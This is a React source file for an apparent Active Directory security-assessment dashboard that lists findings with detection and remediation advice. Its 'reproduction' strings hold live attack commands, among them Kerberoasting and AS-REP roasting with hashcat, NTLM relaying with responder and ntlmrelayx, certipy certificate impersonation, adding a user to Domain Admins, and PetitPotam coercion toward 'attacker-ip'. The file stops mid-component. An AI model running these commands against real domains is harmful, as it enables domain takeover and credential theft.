"use client";

import React, { useState, useEffect, useCallback } from "react";
import {
  Users, ShieldAlert, Network, Key, FileText,
  ChevronDown, ChevronRight, RefreshCw, Copy, Check,
  AlertTriangle, CheckCircle2, XCircle, Eye, Lock,
} from "lucide-react";
import { PageShell } from "../../components/PageShell";
import { useToast } from "../../hooks/useToast";

/* ─── Types ─── */
type Risk = "CRITICAL" | "HIGH" | "MEDIUM" | "LOW";
type TabKey = "overview" | "kerberos" | "ntlm" | "adcs" | "bloodhound" | "findings";

interface ADData {
  domain: {
    name: string; netbios: string; dcs: string[];
    functionalLevel: string; totalUsers: number;
    totalComputers: number; totalGroups: number;
    domainAdmins: number; enumeratedAt: string;
    anonymousBindEnabled: boolean;
  };
  aclFindings: { object: string; trustee: string; right: string; inherited: boolean; risk: Risk }[];
  kerberoastAccounts: {
    samAccountName: string; spn: string; passwordLastSet: string;
    hashType: string; tgsHashFragment: string | null; crackable: boolean; groups: string[];
  }[];
  asrepAccounts: {
    samAccountName: string; dn: string; asrepHashFragment: string;
    hashObtained: boolean; cracked: boolean;
  }[];
  smbSigningHosts: {
    ip: string; hostname: string; smbSigningEnabled: boolean;
    smbSigningRequired: boolean; risk: Risk;
  }[];
  ldapSigning: {
    dcIp: string; ldapSigningRequired: boolean;
    ldapChannelBindingRequired: boolean; risk: Risk;
  };
  adcsTemplates: {
    name: string; displayName: string; oid: string;
    enrolleeSuppliesSubject: boolean; lowPrivEnrollment: boolean;
    lowPrivWriteAccess: boolean; ntlmRelayable: boolean;
    esc1: boolean; esc4: boolean; esc8: boolean;
    enrollmentRights: string[]; ekus: string[]; risk: Risk;
  }[];
  adcsCA: {
    name: string; webEnrollmentUrl: string; ntlmAuthEnabled: boolean;
    esc8Vulnerable: boolean; risk: Risk;
  };
  delegationEntries: {
    accountName: string; accountType: string;
    delegationType: string; allowedTo: string; risk: Risk;
  }[];
  privilegedGroups: { name: string; memberCount: number; members: string[]; risk: Risk }[];
  passwordPolicy: { attribute: string; value: string; status: string; note: string }[];
  trustRelationships: {
    domain: string; direction: string; type: string; sidFiltering: boolean; risk: Risk;
  }[];
}

interface BHData {
  collectionStatus: string; collectionMethods: string[];
  collectedAt: string;
  stats: { users: number; computers: number; groups: number; sessions: number; acls: number };
  daPaths: {
    id: string; length: number; riskScore: number;
    nodes: { label: string; type: string; critical: boolean }[];
    edges: { source: string; target: string; relation: string; technique: string }[];
    narrative: string; cypherQuery: string;
  }[];
}

interface ADFinding {
  id: string;
  title: string;
  severity: Risk;
  mitreTechnique: string;
  mitreId: string;
  cwe?: string;
  affectedObjects: string[];
  reproduction: string[];
  detection: string;
  remediation: string;
}

/* ─── Derive findings from AD data ─── */
function deriveFindings(d: ADData): ADFinding[] {
  const findings: ADFinding[] = [];

  if (d.domain.anonymousBindEnabled) {
    findings.push({
      id: "AD-001", title: "Anonymous LDAP Bind Enabled", severity: "HIGH",
      mitreTechnique: "Account Discovery: Domain Account", mitreId: "T1087.002", cwe: "CWE-306",
      affectedObjects: [`${d.domain.dcs[0]}`],
      reproduction: [
        `ldapsearch -x -H ldap://${d.domain.dcs[0].split(" ")[0]} -b "DC=corp,DC=local"`,
        "Enumerate all users and groups without credentials.",
      ],
      detection: "Alert on LDAP binds where authentication is 'Simple' with empty credentials (Event ID 4625 with Failure reason 0xC000006D).",
      remediation: "Set 'LDAP server signing requirements' to 'Require signing'. Disable anonymous binds via GPO: Computer Configuration → Windows Settings → Security Settings → Account Policies → Network Security: LDAP client signing requirements.",
    });
  }

  if (d.aclFindings.some((a) => a.risk === "CRITICAL")) {
    findings.push({
      id: "AD-002", title: "ACL Abuse: GenericWrite on Privileged Groups", severity: "CRITICAL",
      mitreTechnique: "Account Manipulation", mitreId: "T1098", cwe: "CWE-269",
      affectedObjects: d.aclFindings.filter((a) => a.risk === "CRITICAL").map((a) => a.trustee),
      reproduction: [
        "Identify ACL via BloodHound: (Outbound Object Control → WriteDACL / GenericWrite)",
        `net group "Domain Admins" helpdesk1 /add /domain`,
        "Or via PowerView: Add-DomainGroupMember -Identity 'Domain Admins' -Members 'helpdesk1'",
      ],
      detection: "Monitor Event ID 4728 (member added to security-enabled global group) and 4732 (member added to local group). Alert on non-admin accounts modifying privileged groups.",
      remediation: "Audit AD ACLs with BloodHound or ADACLScanner. Remove unnecessary GenericWrite/WriteDACL rights. Enable 'Protected Users' for privileged accounts. Apply tier-model to restrict admin account usage.",
    });
  }

  const crackableKerberoast = d.kerberoastAccounts.filter((k) => k.crackable);
  if (crackableKerberoast.length > 0) {
    findings.push({
      id: "AD-003", title: `Kerberoastable Service Accounts (${crackableKerberoast.length} accounts)`, severity: "HIGH",
      mitreTechnique: "Steal or Forge Kerberos Tickets: Kerberoasting", mitreId: "T1558.003", cwe: "CWE-522",
      affectedObjects: crackableKerberoast.map((k) => `${k.samAccountName} (${k.spn})`),
      reproduction: [
        "GetUserSPNs.py corp.local/user:pass -dc-ip 10.0.0.10 -request",
        "hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt",
        "Evidence: TGS hash fragment captured — see Kerberos tab for truncated hash.",
      ],
      detection: "Alert on Kerberos TGS requests (Event ID 4769) with encryption type 0x17 (RC4). Large volumes of TGS requests from a single account in short time is anomalous. Enable AES encryption enforcement on all service accounts.",
      remediation: "Rotate all service account passwords to 25+ random chars. Migrate from RC4 to AES encryption (msDS-SupportedEncryptionTypes = 8/16/24). Use Group Managed Service Accounts (gMSA) which auto-rotate. Add SPNed accounts to Protected Users group.",
    });
  }

  if (d.asrepAccounts.length > 0) {
    findings.push({
      id: "AD-004", title: `AS-REP Roastable Accounts (${d.asrepAccounts.length} accounts)`, severity: "HIGH",
      mitreTechnique: "Steal or Forge Kerberos Tickets: AS-REP Roasting", mitreId: "T1558.004", cwe: "CWE-522",
      affectedObjects: d.asrepAccounts.map((a) => a.samAccountName),
      reproduction: [
        "GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -dc-ip 10.0.0.10",
        "hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt",
        "No authentication required — works from unauthenticated context.",
      ],
      detection: "Alert on AS-REQ with PA-ENC-TIMESTAMP missing (Event ID 4768 with Failure Code 0x0 and Pre-Auth Type 0). Baseline expected accounts with DONT_REQUIRE_PREAUTH flag.",
      remediation: "Enable Kerberos pre-authentication for all accounts. Run: Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} to enumerate. Set DoesNotRequirePreAuth = $false for all service and user accounts.",
    });
  }

  const unsignedHosts = d.smbSigningHosts.filter((h) => !h.smbSigningRequired);
  if (unsignedHosts.length > 0) {
    findings.push({
      id: "AD-005", title: `SMB Signing Not Required (${unsignedHosts.length} hosts)`, severity: "HIGH",
      mitreTechnique: "Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning", mitreId: "T1557.001", cwe: "CWE-300",
      affectedObjects: unsignedHosts.map((h) => `${h.hostname} (${h.ip})`),
      reproduction: [
        "responder -I eth0 -rdwv",
        `ntlmrelayx.py -tf targets.txt -smb2support --no-http-server`,
        "Wait for any domain authentication event — relay captured hash to unsigned SMB targets.",
        `Attack surface: ${unsignedHosts.length} hosts accept relayed authentication.`,
      ],
      detection: "Alert on NTLM authentication to unexpected hosts (Event ID 4624 Logon Type 3 with NTLM). Deploy SMB honeypots. Monitor for Responder-like tools via network IDS (LLMNR/NBT-NS poisoning signatures).",
      remediation: "Enable SMB signing via GPO: Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options → 'Microsoft network server: Digitally sign communications (always)' = Enabled. Disable LLMNR and NBT-NS across the domain.",
    });
  }

  if (!d.ldapSigning.ldapSigningRequired) {
    findings.push({
      id: "AD-006", title: "LDAP Signing Not Required on DC", severity: "HIGH",
      mitreTechnique: "Adversary-in-the-Middle", mitreId: "T1557", cwe: "CWE-300",
      affectedObjects: [`DC at ${d.ldapSigning.dcIp}`],
      reproduction: [
        `ntlmrelayx.py -t ldap://${d.ldapSigning.dcIp} -wh attacker-wpad`,
        "Capture any domain auth event and relay to LDAP to create admin account or dump secrets.",
      ],
      detection: "Event ID 2889 (LDAP signing not enforced) logged by Domain Controllers. Enable Diagnostic Logging: LDAP Interface Events = 2.",
      remediation: "Set GPO: 'Domain Controller: LDAP server signing requirements' = Require signing. Enable LDAP Channel Binding (CVE-2017-8563 patch). Apply KB4520412.",
    });
  }

  const esc1 = d.adcsTemplates.filter((t) => t.esc1);
  if (esc1.length > 0) {
    findings.push({
      id: "AD-007", title: `AD CS ESC1: Enrollee Supplies Subject (${esc1.map((t) => t.name).join(", ")})`, severity: "CRITICAL",
      mitreTechnique: "Steal or Forge Authentication Certificates", mitreId: "T1649", cwe: "CWE-295",
      affectedObjects: esc1.map((t) => t.name),
      reproduction: [
        `certipy req -u user@corp.local -p Pass -ca corp-CA -template ${esc1[0].name} -upn administrator@corp.local`,
        "certipy auth -pfx administrator.pfx -domain corp.local -dc-ip 10.0.0.10",
        "Pass-the-Certificate → PKINIT → obtain TGT as Domain Admin.",
      ],
      detection: "Alert on certificate requests where SAN (Subject Alternative Name) differs from requesting user (Event ID 4886, 4887). Monitor CA for certificates with client authentication EKU and user-supplied SANs.",
      remediation: "Disable CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT on affected templates. Enable 'CA Certificate Manager Approval' (Manager Approval) for all sensitive templates. Remove 'Domain Users' from enrollment rights on templates with client auth EKU.",
    });
  }

  const esc4 = d.adcsTemplates.filter((t) => t.esc4);
  if (esc4.length > 0) {
    findings.push({
      id: "AD-008", title: `AD CS ESC4: Template Write Privileges (${esc4.map((t) => t.name).join(", ")})`, severity: "HIGH",
      mitreTechnique: "Steal or Forge Authentication Certificates", mitreId: "T1649", cwe: "CWE-269",
      affectedObjects: esc4.map((t) => t.name),
      reproduction: [
        `certipy template -u user@corp.local -p Pass -template ${esc4[0].name} -save-old`,
        "certipy template -u user@corp.local -p Pass -template WebServer -configuration WebServer.json",
        "Modify template to add ENROLLEE_SUPPLIES_SUBJECT, then exploit as ESC1.",
      ],
      detection: "Alert on AD object modifications to certificate templates (Event ID 4662 with object class pKICertificateTemplate and write access).",
      remediation: "Audit certificate template ACLs. Remove unnecessary write permissions from non-admin principals. Lock template ACLs to Domain Admins / Enterprise Admins only.",
    });
  }

  if (d.adcsCA.esc8Vulnerable) {
    findings.push({
      id: "AD-009", title: "AD CS ESC8: NTLM Relay to Web Enrollment Endpoint", severity: "CRITICAL",
      mitreTechnique: "Steal or Forge Authentication Certificates", mitreId: "T1649", cwe: "CWE-300",
      affectedObjects: [d.adcsCA.webEnrollmentUrl],
      reproduction: [
        `ntlmrelayx.py -t http://${d.adcsCA.webEnrollmentUrl}/certsrv/certfnsh.asp --adcs --template DomainController`,
        "Coerce DC authentication via PetitPotam: python3 PetitPotam.py attacker-ip 10.0.0.10",
        "Relay DC NTLM auth to CA web enrollment → obtain DC certificate → DCSync.",
      ],
      detection: "Alert on certificate requests from unexpected sources to the CA web enrollment. Monitor IIS access logs on CA for POST requests to certfnsh.asp from non-workstation sources.",
      remediation: "Enable EPA (Extended Protection for Authentication) on IIS for certsrv. Disable NTLM authentication on the CA web enrollment endpoint. Block PetitPotam by patching MS-EFSRPC (KB5005413) or filtering the EfsRpcOpenFileRaw call.",
    });
  }

  return findings;
}

/* ─── Helpers ─── */
function riskColor(r: Risk) {
  if (r === "CRITICAL") return "#FF1744";
  if (r === "HIGH")     return "#FF6D00";
  if (r === "MEDIUM")   return "#FFD600";
  return "#00E676";
}

function statusColor(s: string) {
  if (s === "FAIL") return "#FF1744";
  if (s === "WARN") return "#FF6D00";
  return "#00E676";
}

function CopyBtn({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  return (
    <button
      onClick={() => { navigator.clipboard.writeText(text); setCopied(true); setTimeout(() => setCopied(false), 2000); }}
      style={{ background: "none", border: "none", cursor: "pointer", color: copied ? "#00E676" : "#64748B", padding: "2px 4px" }}
    >
      {copied ? <Check size={11} /> : <Copy size={11} />}
    </button>
  );
}

function RiskBadge({ risk }: { risk: Risk }) {
  return (
    <span style={{
      fontFamily: "'JetBrains Mono', monospace", fontSize: 9,
      color: riskColor(risk), background: `${riskColor(risk)}18`,
      border: `1px solid ${riskColor(risk)}35`, borderRadius: 3, padding: "1px 6px",
    }}>
      {risk}
    </span>
  );
}

function SectionHeader({ title, badge, badgeColor }: { title: string; badge?: string; badgeColor?: string }) {
  return (
    <div style={{ padding: "12px 16px", borderBottom: "1px solid var(--adv-border)", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
      <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 12, color: "var(--adv-text)", letterSpacing: 1 }}>{title}</span>
      {badge && (
        <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: badgeColor ?? "var(--adv-accent)", background: `${badgeColor ?? "var(--adv-accent)"}15`, border: `1px solid ${badgeColor ?? "var(--adv-accent)"}30`, borderRadius: 3, padding: "1px 6px" }}>
          {badge}
        </span>
      )}
    </div>
  );
}

function Panel({ children, style }: { children: React.ReactNode; style?: React.CSSProperties }) {
  return (
    <div style={{ background: "var(--adv-bg)", border: "1px solid var(--adv-border)", borderRadius: 6, overflow: "hidden", ...style }}>
      {children}
    </div>
  );
}

/* ─── FindingCard ─── */
function FindingCard({ f }: { f: ADFinding }) {
  const [open, setOpen] = useState(false);
  return (
    <Panel style={{ marginBottom: 8 }}>
      <div onClick={() => setOpen((p) => !p)} style={{ padding: "12px 14px", cursor: "pointer", display: "flex", alignItems: "center", gap: 10 }}>
        <div style={{ width: 8, height: 8, borderRadius: "50%", background: riskColor(f.severity), flexShrink: 0 }} />
        <div style={{ flex: 1 }}>
          <div style={{ display: "flex", alignItems: "center", gap: 8, flexWrap: "wrap" }}>
            <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 11, color: "var(--adv-text)" }}>{f.id}</span>
            <span style={{ fontFamily: "'Inter', sans-serif", fontSize: 13, color: "var(--adv-text)", fontWeight: 600 }}>{f.title}</span>
          </div>
          <div style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "var(--adv-text-muted)", marginTop: 2 }}>
            {f.mitreId} · {f.mitreTechnique}{f.cwe ? ` · ${f.cwe}` : ""}
          </div>
        </div>
        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
          <RiskBadge risk={f.severity} />
          {open ? <ChevronDown size={13} color="#64748B" /> : <ChevronRight size={13} color="#64748B" />}
        </div>
      </div>

      {open && (
        <div style={{ borderTop: "1px solid var(--adv-border)", padding: "14px 16px", display: "flex", flexDirection: "column", gap: 12 }}>
          {/* Affected objects */}
          <div>
            <div style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "var(--adv-text-muted)", marginBottom: 6 }}>AFFECTED OBJECTS</div>
            <div style={{ display: "flex", flexWrap: "wrap", gap: 5 }}>
              {f.affectedObjects.map((o) => (
                <span key={o} style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 10, color: riskColor(f.severity), background: `${riskColor(f.severity)}10`, border: `1px solid ${riskColor(f.severity)}25`, borderRadius: 3, padding: "2px 7px" }}>{o}</span>
              ))}
            </div>
          </div>

          {/* Reproduction */}
          <div>
            <div style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "var(--adv-text-muted)", marginBottom: 6 }}>STEP-BY-STEP REPRODUCTION</div>
            <div style={{ background: "var(--adv-panel)", border: "1px solid var(--adv-border)", borderRadius: 5, overflow: "hidden" }}>
              <div style={{ padding: "5px 10px", borderBottom: "1px solid var(--adv-border)", display: "flex", justifyContent: "flex-end" }}>
                <CopyBtn text={f.reproduction.join("\n")} />
              </div>
              <pre style={{ margin: 0, padding: "10px 12px", fontFamily: "'JetBrains Mono', monospace", fontSize: 10, color: "#00E676", lineHeight: 1.7, overflowX: "auto" }}>
                {f.reproduction.map((s, i) => `${i + 1}. ${s}`).join("\n")}
              </pre>
            </div>
          </div>

          {/* Detection + Remediation */}
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10 }}>
            {[
              { label: "DETECTION OPPORTUNITY", text: f.detection, icon: <Eye size={11} color="#00D4FF" /> },
              { label: "REMEDIATION", text: f.remediation, icon: <CheckCircle2 size={11} color="#00E676" /> },
            ].map(({ label, text, icon }) => (
              <div key={label} style={{ background: "var(--adv-panel)", border: "1px solid var(--adv-border)", borderRadius: 5, padding: "10px 12px" }}>
                <div style={{ display: "flex", alignItems: "center", gap: 5, marginBottom: 6 }}>
                  {icon}
                  <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "var(--adv-text-muted)" }}>{label}</span>
                </div>
                <p style={{ margin: 0, fontFamily: "'Inter', sans-serif", fontSize: 12, color: "var(--adv-text-muted)", lineHeight: 1.5 }}>{text}</p>
              </div>
            ))}
          </div>
        </div>
      )}
    </Panel>
  );
}

/* ─── Tab components ─── */

function OverviewTab({ d }: { d: ADData }) {
  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
      {/* Metric cards */}
      <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(150px, 1fr))", gap: 10 }}>
        {[
          { label: "USERS",       value: d.domain.totalUsers,     color: "var(--adv-accent)" },
          { label: "COMPUTERS",   value: d.domain.totalComputers,  color: "var(--adv-accent)" },
          { label: "GROUPS",      value: d.domain.totalGroups,     color: "var(--adv-accent)" },
          { label: "DOMAIN ADMINS", value: d.domain.domainAdmins, color: "#FF1744" },
          { label: "DCS",         value: d.domain.dcs.length,      color: "#FF6D00" },
        ].map((m) => (
          <div key={m.label} style={{ background: "var(--adv-panel)", border: "1px solid var(--adv-border)", borderRadius: 6, padding: "14px 16px" }}>
            <div style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "var(--adv-text-muted)", marginBottom: 8 }}>{m.label}</div>
            <div style={{ fontFamily: "'Inter', sans-serif", fontSize: 28, fontWeight: 700, color: m.color, lineHeight: 1 }}>{m.value}</div>
          </div>
        ))}
      </div>

      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16 }}>
        {/* Domain Info */}
        <Panel>
          <SectionHeader title="LDAP ENUMERATION — DOMAIN INFO"
            badge={d.domain.anonymousBindEnabled ? "ANON BIND ENABLED" : "ANON BIND DISABLED"}
            badgeColor={d.domain.anonymousBindEnabled ? "#FF1744" : "#00E676"} />
          <div style={{ padding: 16 }}>
            {[
              { label: "Domain", value: d.domain.name },
              { label: "NetBIOS", value: d.domain.netbios },
              { label: "Forest Level", value: d.domain.functionalLevel },
              { label: "DCs", value: d.domain.dcs.join(" · ") },
              { label: "Enumerated", value: new Date(d.domain.enumeratedAt).toLocaleString() },
            ].map((r) => (
              <div key={r.label} style={{ display: "flex", padding: "7px 0", borderBottom: "1px solid var(--adv-border)" }}>
                <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 10, color: "var(--adv-text-muted)", width: 130, flexShrink: 0 }}>{r.label}</span>
                <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 10, color: "var(--adv-text)" }}>{r.value}</span>
              </div>
            ))}
          </div>
        </Panel>

        {/* Password Policy */}
        <Panel>
          <SectionHeader title="PASSWORD POLICY AUDIT" />
          <div style={{ overflowX: "auto" }}>
            <table style={{ width: "100%", borderCollapse: "collapse" }}>
              <thead>
                <tr>
                  {["ATTRIBUTE", "VALUE", "STATUS", "NOTE"].map((h) => (
                    <th key={h} style={{ padding: "8px 12px", textAlign: "left", fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "var(--adv-text-muted)", borderBottom: "1px solid var(--adv-border)" }}>{h}</th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {d.passwordPolicy.map((r, i) => (
                  <tr key={r.attribute}>
                    <td style={{ padding: "7px 12px", fontFamily: "'JetBrains Mono', monospace", fontSize: 10, color: "var(--adv-text)", borderBottom: i < d.passwordPolicy.length - 1 ? "1px solid var(--adv-border)" : "none" }}>{r.attribute}</td>
                    <td style={{ padding: "7px 12px", fontFamily: "'JetBrains Mono', monospace", fontSize: 10, color: "var(--adv-accent)", borderBottom: i < d.passwordPolicy.length - 1 ? "1px solid var(--adv-border)" : "none" }}>{r.value}</td>
                    <td style={{ padding: "7px 12px", borderBottom: i < d.passwordPolicy.length - 1 ? "1px solid var(--adv-border)" : "none" }}>
                      <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: statusColor(r.status), background: `${statusColor(r.status)}15`, borderRadius: 3, padding: "1px 5px" }}>{r.status}</span>
                    </td>
                    <td style={{ padding: "7px 12px", fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "var(--adv-text-muted)", borderBottom: i < d.passwordPolicy.length - 1 ? "1px solid var(--adv-border)" : "none" }}>{r.note}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </Panel>
      </div>

      {/* ACL Findings */}
      <Panel>
        <SectionHeader title="LDAP ACL ANALYSIS — ACE ABUSE OPPORTUNITIES" badge="T1098" badgeColor="#FF1744" />
        <div style={{ overflowX: "auto" }}>
          <table style={{ width: "100%", borderCollapse: "collapse" }}>
            <thead>
              <tr>
                {["TRUSTEE", "RIGHT", "TARGET OBJECT", "INHERITED", "RISK"].map((h) => (
                  <th key={h} style={{ padding: "8px 12px", textAlign: "left", fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "var(--adv-text-muted)", borderBottom: "1px solid var(--adv-border)" }}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {d.aclFindings.map((a, i) => (
                <tr key={i}>
                  <td style={{ padding: "9px 12px", fontFamily: "'JetBrains Mono', monospace", fontSize: 11, color: riskColor(a.risk), borderBottom: "1px solid var(--adv-border)" }}>{a.trustee}</td>
                  <td style={{ padding: "9px 12px", fontFamily: "'JetBrains Mono', monospace", fontSize: 10, color: "#FFD600", borderBottom: "1px solid var(--adv-border)" }}>{a.right}</td>
                  <td style={{ padding: "9px 12px", fontFamily: "'Inter', sans-serif", fontSize: 11, color: "var(--adv-text-muted)", maxWidth: 280, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", borderBottom: "1px solid var(--adv-border)" }}>{a.object}</td>
                  <td style={{ padding: "9px 12px", borderBottom: "1px solid var(--adv-border)" }}>
                    <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: a.inherited ? "#00E676" : "#FF6D00", background: a.inherited ? "#00E67615" : "#FF6D0015", borderRadius: 3, padding: "1px 5px" }}>{a.inherited ? "YES" : "NO"}</span>
                  </td>
                  <td style={{ padding: "9px 12px", borderBottom: "1px solid var(--adv-border)" }}><RiskBadge risk={a.risk} /></td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </Panel>
    </div>
  );
}

function KerberosTab({ d }: { d: ADData }) {
  const [showHash, setShowHash] = useState<string | null>(null);

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
      {/* Kerberoasting */}
      <Panel>
        <SectionHeader title="KERBEROASTABLE SERVICE ACCOUNTS" badge="T1558.003" badgeColor="#FF1744" />
        <div style={{ overflowX: "auto" }}>
          <table style={{ width: "100%", borderCollapse: "collapse" }}>
            <thead>
              <tr>
                {["ACCOUNT", "SPN", "HASH TYPE", "LAST PW SET", "TGS HASH", "CRACKABLE", "GROUPS"].map((h) => (
                  <th key={h} style={{ padding: "8px 12px", textAlign: "left", fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "var(--adv-text-muted)", borderBottom: "1px solid var(--adv-border)" }}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {d.kerberoastAccounts.map((acct, i) => (
                <tr key={acct.samAccountName}>
                  <td style={{ padding: "10px 12px", fontFamily: "'JetBrains Mono', monospace", fontSize: 11, color: "#FF1744", borderBottom: "1px solid var(--adv-border)" }}>{acct.samAccountName}</td>
                  <td style={{ padding: "10px 12px", fontFamily: "'JetBrains Mono', monospace", fontSize: 10, color: "var(--adv-text)", borderBottom: "1px solid var(--adv-border)" }}>{acct.spn}</td>
                  <td style={{ padding: "10px 12px", fontFamily: "'JetBrains Mono', monospace", fontSize: 10, color: acct.hashType.includes("RC4") ? "#FF6D00" : "#00E676", borderBottom: "1px solid var(--adv-border)" }}>{acct.hashType}</td>
                  <td style={{ padding: "10px 12px", fontFamily: "'JetBrains Mono', monospace", fontSize: 10, color: "var(--adv-text-muted)", borderBottom: "1px solid var(--adv-border)" }}>{acct.passwordLastSet}</td>
                  <td style={{ padding: "10px 12px", borderBottom: "1px solid var(--adv-border)" }}>
                    {acct.tgsHashFragment ? (
                      <button onClick={() => setShowHash(showHash === acct.samAccountName ? null : acct.samAccountName)}
                        style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "#00D4FF", background: "rgba(0,212,255,0.08)", border: "1px solid rgba(0,212,255,0.2)", borderRadius: 3, padding: "2px 6px", cursor: "pointer" }}>
                        {showHash === acct.samAccountName ? "HIDE" : "SHOW EVIDENCE"}
                      </button>
                    ) : <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "#64748B" }}>AES only</span>}
                  </td>
                  <td style={{ padding: "10px 12px", borderBottom: "1px solid var(--adv-border)" }}>
                    <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: acct.crackable ? "#FF1744" : "#00E676", background: acct.crackable ? "#FF174415" : "#00E67615", borderRadius: 3, padding: "1px 5px" }}>{acct.crackable ? "YES" : "NO"}</span>
                  </td>
                  <td style={{ padding: "10px 12px", fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "var(--adv-text-muted)", borderBottom: "1px solid var(--adv-border)" }}>{acct.groups.join(", ")}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
        {showHash && (() => {
          const acct = d.kerberoastAccounts.find((a) => a.samAccountName === showHash);
          return acct?.tgsHashFragment ? (
            <div style={{ margin: "0 14px 14px", background: "var(--adv-panel)", border: "1px solid var(--adv-border)", borderRadius: 5 }}>
              <div style={{ padding: "5px 10px", borderBottom: "1px solid var(--adv-border)", display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "var(--adv-text-muted)" }}>TGS HASH EVIDENCE ({acct.samAccountName}) — offline crack only</span>
                <CopyBtn text={acct.tgsHashFragment} />
              </div>
              <pre style={{ margin: 0, padding: "10px 12px", fontFamily: "'JetBrains Mono', monospace", fontSize: 10, color: "#FF6D00", lineHeight: 1.6, overflowX: "auto" }}>{acct.tgsHashFragment}</pre>
            </div>
          ) : null;
        })()}
      </Panel>

      {/* AS-REP Roasting */}
      <Panel>
        <SectionHeader title="AS-REP ROASTABLE ACCOUNTS — No Pre-Auth Required" badge="T1558.004" badgeColor="#FF6D00" />
        <div style={{ overflowX: "auto" }}>
          <table style={{ width: "100%", borderCollapse: "collapse" }}>
            <thead>
              <tr>
                {["ACCOUNT", "DISTINGUISHED NAME", "AS-REP HASH", "HASH OBTAINED", "STATUS"].map((h) => (
                  <th key={h} style={{ padding: "8px 12px", textAlign: "left", fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "var(--adv-text-muted)", borderBottom: "1px solid var(--adv-border)" }}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {d.asrepAccounts.map((acct, i) => (
                <tr key={acct.samAccountName}>
                  <td style={{ padding: "10px 12px", fontFamily: "'JetBrains Mono', monospace", fontSize: 11, color: "#FF6D00", borderBottom: "1px solid var(--adv-border)" }}>{acct.samAccountName}</td>
                  <td style={{ padding: "10px 12px", fontFamily: "'JetBrains Mono', monospace", fontSize: 10, color: "var(--adv-text-muted)", borderBottom: "1px solid var(--adv-border)" }}>{acct.dn}</td>
                  <td style={{ padding: "10px 12px", borderBottom: "1px solid var(--adv-border)" }}>
                    <div style={{ display: "flex", alignItems: "center", gap: 5 }}>
                      <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: "#64748B", maxWidth: 200, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{acct.asrepHashFragment}</span>
                      <CopyBtn text={acct.asrepHashFragment} />
                    </div>
                  </td>
                  <td style={{ padding: "10px 12px", borderBottom: "1px solid var(--adv-border)" }}>
                    <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: acct.hashObtained ? "#FF1744" : "#64748B", background: acct.hashObtained ? "#FF174415" : "transparent", borderRadius: 3, padding: "1px 5px" }}>{acct.hashObtained ? "YES" : "NO"}</span>
                  </td>
                  <td style={{ padding: "10px 12px", borderBottom: "1px solid var(--adv-border)" }}>
                    <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: acct.cracked ? "#FF1744" : "var(--adv-accent)", background: acct.cracked ? "#FF174415" : "rgba(37,99,235,0.1)", borderRadius: 3, padding: "1px 5px" }}>{acct.cracked ? "CRACKED" : "PENDING"}</span>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </Panel>
    </div>
  );
}

function NTLMRelayTab({ d }: { d: ADData }) {
  const unsignedCount = d.smbSigningHosts.filter((h) => !h.smbSigningRequired).length;

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
      {/* Summary cards */}
      <div style={{ display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: 10 }}>
        {[
          { label: "UNSIGNED SMB HOSTS", value: unsignedCount, color: unsignedCount > 0 ? "#FF1744" : "#00E676" },
          { label: "LDAP SIGNING REQUIRED", value: d.ldapSigning.ldapSigningRequired ? "YES" : "NO", color: d.ldapSigning.ldapSigningRequired ? "#00E676" : "#FF1744" },
